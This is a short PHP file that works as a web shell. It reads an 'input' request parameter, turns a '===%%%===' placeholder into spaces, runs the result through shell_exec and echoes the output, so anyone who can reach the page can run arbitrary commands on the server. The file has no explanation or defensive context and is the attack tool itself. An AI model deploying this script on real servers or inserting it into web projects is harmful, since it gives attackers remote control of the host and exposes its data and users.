<?php
$my_arg  = $_REQUEST["input"];
# ===%%%=== is used as a replacement for spaces (which are not allowed in http request url...)
$command = str_replace('===%%%===',' ',$my_arg);
$output  = shell_exec($command);
echo $output;
?>
